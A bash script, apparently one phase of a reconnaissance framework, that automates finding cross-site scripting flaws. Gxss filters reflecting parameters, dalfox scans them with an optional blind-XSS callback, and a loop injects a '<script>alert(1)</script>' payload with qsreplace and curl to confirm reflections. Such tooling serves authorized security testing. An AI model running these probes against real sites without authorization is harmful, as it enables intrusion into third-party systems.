#!/usr/bin/env bash
# Phase 15 — XSS-targeted (Gxss reflection filter → dalfox confirmation).

PHASE="15-xss-targeted"
. "$(dirname "$0")/_lib.sh"

require_target
OUTDIR=$(out_dir "$PHASE")
GF_XSS="$RECONFORGE_OUTPUT_DIR/$TARGET/$DATESTAMP/11-pattern-filter/gf-xss.txt"
PAYLOAD_XSS="$RECONFORGE_OUTPUT_DIR/$TARGET/$DATESTAMP/12-payload-replace/xss-payloads.txt"

if [ ! -s "$GF_XSS" ] && [ ! -s "$PAYLOAD_XSS" ]; then
    log ERR "no gf xss candidates; run 11-pattern-filter.sh first"
    exit 5
fi

INPUT="$GF_XSS"
REFLECTED="$OUTDIR/reflected.txt"

# Stage 1: cheap reflection sieve (Gxss). Trims dalfox's surface to actual
# reflectors — saves 5x to 20x on dalfox runtime.
if command -v Gxss >/dev/null 2>&1; then
    log INFO "Gxss reflection sieve"
    cat "$INPUT" | Gxss -p Xss -c "$THREADS" 2>/dev/null \
        | grep -i "url" | cut -d '"' -f2 | sort -u > "$REFLECTED" || true
    log INFO "Gxss → $(wc -l < "$REFLECTED" 2>/dev/null || echo 0) reflectors"
else
    cp "$INPUT" "$REFLECTED"
fi

# Stage 2: dalfox confirmation (with optional blind XSS callback)
if command -v dalfox >/dev/null 2>&1; then
    log INFO "dalfox scan"
    BLIND_FLAG=""
    [ -n "${BLIND_XSS_URL:-}" ] && BLIND_FLAG="-b $BLIND_XSS_URL"
    dalfox file "$REFLECTED" $BLIND_FLAG \
        --skip-bav --silence -o "$OUTDIR/dalfox.txt" 2>/dev/null || true
fi

# Stage 3: hard confirmation grep (the doc's mass reflected-xss one-liner)
log INFO "hard-confirm grep on reflected payload"
: > "$OUTDIR/confirmed.txt"
if command -v qsreplace >/dev/null 2>&1 && [ -s "$REFLECTED" ]; then
    cat "$REFLECTED" | qsreplace '"><script>alert(1)</script>' | while read -r u; do
        if curl -s --max-time 8 --path-as-is --insecure "$u" 2>/dev/null \
            | grep -qs '<script>alert(1)</script>'; then
            echo "$u" >> "$OUTDIR/confirmed.txt"
            log INFO "CONFIRMED XSS: $u"
        fi
    done
fi

log INFO "Phase 15 done — $(wc -l < "$OUTDIR/confirmed.txt" 2>/dev/null || echo 0) hard-confirmed XSS"
